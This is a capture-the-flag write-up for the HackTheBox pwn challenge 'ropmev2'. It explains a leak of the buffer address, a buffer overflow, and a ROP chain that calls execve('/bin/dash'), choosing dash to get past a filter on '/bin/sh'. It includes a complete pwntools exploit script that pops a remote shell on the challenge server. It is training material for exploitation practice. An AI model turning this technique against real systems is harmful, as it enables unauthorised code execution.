# [ropmev2](https://www.hackthebox.eu/home/challenges/Pwn) - PWN Challenge (40 points)  

##### We are facing a 64 bit elf with only NX enabled. That's a nice start.  
  
## DISASSEMBLY
##### In **IDA**, we can see that there is a buffer that stores up to 208 bytes. It asks for an input and compares it with ***'DEBUG\N'*** and if they are the same, the program leaks the address of the buffer. After that, a call to **main()** occurs, making the program to loop. So far so good, we have a ***leak*** and a possible *bof* due to the fact that **read()**  reads up to 500 bytes and stores them to buf. There is also a function that rotates the characters of the buf according to which letter is reads. 

## EXECUTION  
##### Giving 'DEBUG' many times in the program, we get different address of the buf. Observating them, we can see that each of them is at 224 offset from the previous/next. From this, we can calculate the address of the next buf.  

## CRAFTING PAYLOAD
##### We have no libc, so we won't use .got and .plt. What we are gonna do is use **syscall(execve('/bin/dash'))**. (We are not using '/bin/sh' cause there is a troll script in the server that echoes 'LOL NOPE' and exits when it reads '/bin/sh'). We are going to leak the addr of buf, then fill the next buf (we know the offset of next buf) with:  

```  
 '/ova/qnfu\x00', ('/bin/dash') but with the rotation according to the func
 junk
 rax with 0x3b
 rdi with leaked 
 rsi with \x00
 rdx with \x00
 syscall
```
## EXPLOIT
```
from pwn import *

ip = 'docker.hackthebox.eu'
port = 31213 # change this
filename = './ropmev2' # change this

def pwn():
    r = remote(ip, port)
    #r = process(filename)
    elf = ELF(filename)
    rop = ROP(elf)

    # Find the necessary gadgets #
    rdi = p64(rop.find_gadget(['pop rdi'])[0])
    rsi = p64(rop.find_gadget(['pop rsi'])[0])
    rax = p64(rop.find_gadget(['pop rax'])[0])
    rdx = p64(rop.find_gadget(['pop rdx'])[0])
    syscall = p64(rop.find_gadget(['syscall'])[0])

    # Leak the address of buf #
    payload = 'DEBUG'
    r.sendlineafter('hack me', payload)
    r.recvuntil('this is')
    leaked = r.recvline().strip()
    leaked = int(leaked, 16)
    r.recvuntil('hack me')

    # Calculate buffer's offset #
    off = 224
    leaked -= off
    leaked = p64(leaked)

    # Craft payload syscall(execve('/bin/dash')) #
    sh = '/ova/qnfu\x00' # /bin/dash cause there is a func that changes the letters of buf.
    payload = sh + 'a'*(216 -len(sh)) + rax + p64(0x3b)
    payload += rdi + leaked + rsi + p64(0x00) + p64(0x00)
    payload += rdx + p64(0x00) + p64(0x00) + syscall
    r.sendline(payload)
    r.interactive()

pwn()
```

Link: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

[![W3tH4nds](https://www.hackthebox.eu/badge/image/70668)](https://www.hackthebox.eu/home/users/profile/70668)

